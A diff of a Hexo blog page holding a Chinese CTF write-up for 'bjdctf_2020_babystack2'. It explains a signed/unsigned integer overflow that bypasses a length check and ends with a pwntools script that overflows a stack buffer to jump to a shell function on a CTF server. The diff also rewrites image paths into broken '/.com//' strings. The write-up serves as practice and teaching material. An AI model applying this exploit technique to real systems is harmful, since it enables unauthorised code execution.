@@ -23,19 +23,19 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="bjdctf_2020_babystack2(整数溢出)  拿到题目，我们先checksec一下：  清楚的看到，这道题目，是没有开启canary保护的，也就是说，这是一道栈溢出的题目。 我们使用IDA进行反编译：  可以看到整个题目的一个大致流程，让我们输入一个数字，这个数字表示我们可以向&amp;buf地址中写入数据的大小，但是前面有一个验证，我们输入的数字大于10，程序就会自动退出，IDA显">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/2.png">
-<meta property="og:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/1.png">
-<meta property="og:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/3.png">
-<meta property="og:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/4.png">
-<meta property="og:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/5.png">
-<meta property="og:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/6.png">
-<meta property="og:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/7.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/.com//3.png">
+<meta property="og:image" content="http://example.com/.com//4.png">
+<meta property="og:image" content="http://example.com/.com//5.png">
+<meta property="og:image" content="http://example.com/.com//6.png">
+<meta property="og:image" content="http://example.com/.com//7.png">
 <meta property="article:published_time" content="2024-05-26T11:29:47.000Z">
 <meta property="article:modified_time" content="2024-05-26T15:21:58.768Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn(整数溢出)">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/2.png">
+<meta name="twitter:image" content="http://example.com/.com//2.png">
   
   
   
@@ -284,20 +284,20 @@
                 <h1 align="center">bjdctf_2020_babystack2(整数溢出)</h1>
 
 <p>拿到题目，我们先checksec一下：</p>
-<p><img src="/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>清楚的看到，这道题目，是没有开启canary保护的，也就是说，这是一道栈溢出的题目。</p>
 <p>我们使用IDA进行反编译：</p>
-<p><img src="/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>可以看到整个题目的一个大致流程，让我们输入一个数字，这个数字表示我们可以向&amp;buf地址中写入数据的大小，但是前面有一个验证，我们输入的数字大于10，程序就会自动退出，IDA显示，buf变量的大小为0x10字节，我们想要造成栈溢出，就要绕过这里的if函数，使我们写入的数据能够更多，从而覆盖返回地址。我们可以看到，我们读入的是一个signed int ，也就是一个有符号的整数，而read函数的第三个参数传入的类型是size_t，意思就是无符号整数。</p>
-<p><img src="/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>我们可以看看下面的这张图片:</p>
-<p><img src="/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p><img src="/.com//4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>如果我们传入-1(即0xffffffff)，在进行if判断的时候，这时我们的nbytes变量作为有符号的整数，被视作-1小于10，成功的绕过了if函数，当函数执行进入read函数的时候，此时，nbytes变量被当作无符号整数，最高位不再代表正负，此时大小为：4294967295(0xffffffff)，此时我们能够写入的数据就变的非常的大，就可以写满buf并覆盖返回地址，进行栈溢出。下面是我们要溢出的函数：</p>
-<p><img src="/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>使用gdb，将断点打在main函数快要结束的地方（0x400826）(leave)，去验证我们到底要覆盖多少字节，才可以覆盖到返回地址：</p>
-<p><img src="/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p><img src="/.com//6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>我们输入10和AAAAAAAAAA，可以看到，此时stack的排布:</p>
-<p><img src="/bjdctf-2020-babystack2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
+<p><img src="/.com//7.png" srcset="/img/loading.gif" lazyload alt="7"></p>
 <p>可以看到,”A”写入的起始地址距离__libc_start_main+243大小为:0x18，脚本如下:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> <br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>sh = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26480</span>)<br><br>sh.recvuntil(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>)<br><br>sh.sendline(<span class="hljs-string">&quot;-1&quot;</span>)<br><br>shell_address = <span class="hljs-number">0x400726</span><br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0x8</span>) + p64(shell_address)<br><br>sh.recvuntil(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
